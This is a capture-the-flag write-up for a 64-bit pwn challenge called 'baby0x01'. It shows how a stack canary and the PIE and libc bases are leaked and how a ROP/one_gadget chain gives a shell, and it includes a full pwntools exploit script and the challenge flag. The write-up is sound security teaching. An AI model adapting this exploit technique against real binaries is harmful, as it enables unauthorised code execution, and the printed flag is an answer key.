# baby0x01

## pwn - Points: 537

> You gotta crawl before you can walk...
>
> [chall](chall)

The binary has all typical security mechanisms enabled:

```bash
$ checksec chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

It lets us read as many bytes as we want into a 72 byte buffer as many times as we want. The program returns when we enter nothing, so we can overflow the buffer and get code execution.

In order to overwrite the `RIP` we have to leak the canary value. The variable that contains the value lies directly behind the buffer we are writing to, so we have only have to overwrite a single byte `0x0a` and the `printf` call of the program prints out our input followed by the canary value.

We are now able to overwrite the canary variable with the correct value and have control of the `RIP`. Now where should we jump to? Since `NX` is enabled we have to use `ROP` and `ret-2-libc` to spawn our shell.

Since `PIE` is also enabled we have to leak the correct base address of our program. Right after the canary value and right before the `RIP` lies the `RBP`, that we can read out similarly to the canary. 

To be able to calculate the addresses inside the `libc` we have to leak its base address. To achieve this, we build a `ROP` chain that calls the `puts` function with the argument of the `puts` entry in the `GOT` table. This will now print out the address of `puts` that we can use to calculate the `libc` base. To spawn the shell we can use `one_gadget` with the found offset.

Here is the full exploit script:
```python
from pwn import *


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF('chall')

p = process('chall')

p.sendlineafter('buffer: ', 'A' * 72 + 'x')
p.recvuntil('x')

canary = u64('\x00' + p.recv(7))
log.info('canary: {}'.format(hex(canary)))

p.sendlineafter('buffer: ', 'A' * 72 + 'B' * 8 + 'x')
p.recvuntil('x')

base_addr = u64('\x00' + p.recv(5) + '\x00\x00') - 0xb00
log.info('base: {}'.format(hex(base_addr)))

pop_rdi_ret = 0x0000000000000c33 # pop rdi ; ret

p.sendlineafter('buffer: ', 'A' * 72 + p64(canary) + p64(0x0) + p64(base_addr + pop_rdi_ret) + p64(base_addr + e.got['puts']) + p64(base_addr + e.plt['puts']) + p64(base_addr + 0x7d0))
p.sendlineafter('buffer: ', '')

leak = u64(p.recvline()[:-1] + '\x00\x00')
libc_base = leak - libc.symbols['puts']
log.info('libc base: {}'.format(hex(libc_base)))
one_gadget = libc_base + 0x4f2c5

p.sendlineafter('buffer: ', 'A' * 72 + p64(canary) + p64(0x0) + p64(one_gadget))
p.sendlineafter('buffer: ', '')
p.interactive()
```

flag: `SECT{g0_Go_g4dG37_m4st3r}`